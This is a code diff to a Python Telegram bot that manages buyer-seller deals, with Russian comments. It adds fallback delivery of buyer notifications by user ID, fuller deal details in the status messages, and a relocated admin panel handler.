@@ -277,8 +277,11 @@ async def send_welcome_message(message: types.Message):
     )
 
 async def send_buyer_pending_message(deal_id: str):
+    """Отправляет покупателю сообщение с неактивной кнопкой"""
     deal = deals[deal_id]
     keyboard = buyer_pending_keyboard(deal_id)
+    
+    # Пробуем отправить по username
     try:
         msg = await bot.send_message(
             deal["buyer_username"],
@@ -286,14 +289,34 @@ async def send_buyer_pending_message(deal_id: str):
             f"📦 Товар: {deal['product']}\n"
             f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
             f"👤 Продавец: @{deal['seller_username']}\n\n"
-            f"⏳ Продавец получил уведомление. Как только он передаст товар — вы сможете подтвердить получение.",
+            f"⏳ ПРОДАВЕЦ ПОЛУЧИЛ УВЕДОМЛЕНИЕ.\n\n"
+            f"⚡️ КАК ТОЛЬКО ОН ПЕРЕДАСТ ТОВАР — У ВАС ПОЯВИТСЯ КНОПКА «ПОЛУЧИЛ ТОВАР»",
             reply_markup=keyboard
         )
-        deals[deal_id]["buyer_message_id"] = msg.message_id
-        deals[deal_id]["buyer_chat_id"] = msg.chat.id
+        deal["buyer_message_id"] = msg.message_id
+        deal["buyer_chat_id"] = msg.chat.id
         save_deals(deals)
+        return
     except Exception as e:
-        print(f"Ошибка отправки покупателю: {e}")
+        print(f"Ошибка отправки по username: {e}")
+    
+    # Если есть buyer_id, пробуем отправить по ID
+    if deal.get("buyer_id"):
+        try:
+            msg = await bot.send_message(
+                deal["buyer_id"],
+                f"🛒 СДЕЛКА #{deal_id} ОПЛАЧЕНА!\n\n"
+                f"📦 Товар: {deal['product']}\n"
+                f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
+                f"👤 Продавец: @{deal['seller_username']}\n\n"
+                f"⏳ ОЖИДАНИЕ ПЕРЕДАЧИ ТОВАРА...",
+                reply_markup=keyboard
+            )
+            deal["buyer_message_id"] = msg.message_id
+            deal["buyer_chat_id"] = msg.chat.id
+            save_deals(deals)
+        except Exception as e:
+            print(f"Ошибка отправки по ID: {e}")
 
 # ========== СТАРТ ==========
 @dp.message(Command("start"))
@@ -305,6 +328,10 @@ async def cmd_start(message: types.Message):
             return
         
         deal = deals[deal_id]
+        
+        # СОХРАНЯЕМ ID ПОКУПАТЕЛЯ
+        deal["buyer_id"] = message.from_user.id
+        save_deals(deals)
         
         if message.from_user.username != deal["buyer_username"]:
             await message.answer(
@@ -541,6 +568,7 @@ async def get_buyer(message: types.Message, state: FSMContext):
         "seller_id": message.from_user.id,
         "seller_username": message.from_user.username,
         "buyer_username": buyer_username,
+        "buyer_id": None,
         "product": data["product"],
         "currency": data["currency"],
         "amount": data["amount"],
@@ -716,30 +744,60 @@ async def seller_delivered(callback: types.CallbackQuery):
     
     await callback.message.edit_text(
         f"✅ ВЫ ПОДТВЕРДИЛИ ПЕРЕДАЧУ ТОВАРА!\n\n"
-        f"ОЖИДАЕМ ПОДТВЕРЖДЕНИЯ ОТ ПОКУПАТЕЛЯ..."
+        f"📦 Товар: {deal['product']}\n"
+        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
+        f"👤 Покупатель: @{deal['buyer_username']}\n\n"
+        f"⏳ ОЖИДАЕМ ПОДТВЕРЖДЕНИЯ ОТ ПОКУПАТЕЛЯ..."
     )
     
+    active_keyboard = buyer_confirm_keyboard(deal_id)
+    updated = False
+    
+    # Пробуем обновить существующее сообщение
     if deal.get("buyer_message_id") and deal.get("buyer_chat_id"):
-        active_keyboard = buyer_confirm_keyboard(deal_id)
         try:
             await bot.edit_message_reply_markup(
                 chat_id=deal["buyer_chat_id"],
                 message_id=deal["buyer_message_id"],
                 reply_markup=active_keyboard
             )
+            updated = True
         except Exception as e:
-            await callback.message.answer(f"⚠️ НЕ УДАЛОСЬ ОБНОВИТЬ КНОПКУ У ПОКУПАТЕЛЯ: {e}")
-    else:
-        await bot.send_message(
-            deal["buyer_username"],
-            f"📦 ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР!\n\n"
-            f"СДЕЛКА #{deal_id}\n"
-            f"📦 Товар: {deal['product']}\n\n"
-            f"✅ ПОДТВЕРДИТЕ ПОЛУЧЕНИЕ ТОВАРА:",
-            reply_markup=buyer_confirm_keyboard(deal_id)
-        )
+            print(f"Не удалось обновить клавиатуру: {e}")
     
-    await callback.answer()
+    # Если не обновилось — отправляем новое сообщение
+    if not updated:
+        try:
+            # Пробуем отправить по username
+            await bot.send_message(
+                deal["buyer_username"],
+                f"📦 ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР ПО СДЕЛКЕ #{deal_id}!\n\n"
+                f"📦 Товар: {deal['product']}\n"
+                f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
+                f"👤 Продавец: @{deal['seller_username']}\n\n"
+                f"✅ ПОДТВЕРДИТЕ ПОЛУЧЕНИЕ ТОВАРА:",
+                reply_markup=active_keyboard
+            )
+        except:
+            # Если есть buyer_id
+            if deal.get("buyer_id"):
+                try:
+                    await bot.send_message(
+                        deal["buyer_id"],
+                        f"📦 ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР ПО СДЕЛКЕ #{deal_id}!\n\n"
+                        f"📦 Товар: {deal['product']}\n"
+                        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
+                        f"👤 Продавец: @{deal['seller_username']}\n\n"
+                        f"✅ ПОДТВЕРДИТЕ ПОЛУЧЕНИЕ ТОВАРА:",
+                        reply_markup=active_keyboard
+                    )
+                except Exception as e:
+                    await callback.message.answer(
+                        f"⚠️ НЕ УДАЛОСЬ УВЕДОМИТЬ ПОКУПАТЕЛЯ @{deal['buyer_username']}\n\n"
+                        f"Отправьте ему эту ссылку:\nhttps://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
+                    )
+    
+    await callback.answer("✅ Продавец подтвердил передачу товара")
 
 # ========== ПОКУПАТЕЛЬ ПОДТВЕРЖДАЕТ ПОЛУЧЕНИЕ ==========
 @dp.callback_query(lambda c: c.data.startswith("buyer_confirm_"))
@@ -862,6 +920,13 @@ async def support(message: types.Message):
         disable_web_page_preview=True
     )
 
+# ========== АДМИН-ПАНЕЛЬ ==========
+@dp.message(F.text == "👑 АДМИН ПАНЕЛЬ")
+async def admin_panel(message: types.Message):
+    if not is_admin(message.from_user.id):
+        return
+    await message.answer("👑 ПАНЕЛЬ АДМИНИСТРАТОРА\n\nВЫБЕРИТЕ ДЕЙСТВИЕ:", reply_markup=admin_panel_keyboard())
+
 # ========== НАКРУТКА БАЛАНСА АДМИНОМ ==========
 @dp.callback_query(lambda c: c.data == "admin_add_balance")
 async def admin_add_balance_start(callback: types.CallbackQuery, state: FSMContext):
@@ -924,13 +989,6 @@ async def admin_add_balance_amount(message: types.Message, state: FSMContext):
         await state.clear()
     except:
         await message.answer("❌ ВВЕДИТЕ ПОЛОЖИТЕЛЬНОЕ ЧИСЛО")
-
-# ========== АДМИН-ПАНЕЛЬ ==========
-@dp.message(F.text == "👑 АДМИН ПАНЕЛЬ")
-async def admin_panel(message: types.Message):
-    if not is_admin(message.from_user.id):
-        return
-    await message.answer("👑 ПАНЕЛЬ АДМИНИСТРАТОРА\n\nВЫБЕРИТЕ ДЕЙСТВИЕ:", reply_markup=admin_panel_keyboard())
 
 @dp.callback_query(lambda c: c.data == "withdraw_requests")
 async def show_withdraw_requests(callback: types.CallbackQuery):
